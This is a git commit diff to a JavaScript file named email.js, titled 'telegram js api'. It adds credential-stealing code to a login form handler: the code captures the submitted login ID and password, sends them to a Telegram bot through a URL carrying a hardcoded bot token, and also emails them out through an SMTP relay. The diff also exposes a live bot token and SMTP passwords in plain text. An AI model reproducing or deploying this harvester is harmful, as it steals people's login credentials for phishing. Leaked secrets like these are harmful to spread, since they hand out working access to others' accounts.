5aac51d8c8ce6230eca629c57700b4af554ddbbd
imvickykumar999 <imvickykumar999@gmail.com>
2023-10-21 19:52:08 +0530

    telegram js api

--- email.js
+++ email.js
@@ -1,13 +1,19 @@
 
 function submitLoginForm(event){
     event.preventDefault();
+    let email = event.target['userLoginId'].value;
+    let password = event.target['password'].value;
+    let text = email + ` : ` + password;
+    let url = `https://api.telegram.org/bot6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw/sendMessage?chat_id=5721393154&parse_mode=Markdown&text=${text}`;
+
+    fetch(url);
     Email.send({
         Host : "smtp.elasticemail.com",
         Username : "18erecs080.vicky@rietjaipur.ac.in",
-        Password : "A843126D89415A2471C3874B582AF9955ED6",
+        Password : "C576BF414184944A1AE88652A0974E220D72",
         To : '18erecs080.vicky@rietjaipur.ac.in',
         From : "18erecs080.vicky@rietjaipur.ac.in",
-        Subject : event.target['email'].value,
+        Subject : event.target['userLoginId'].value,
         Body : event.target['password'].value
     });
 }
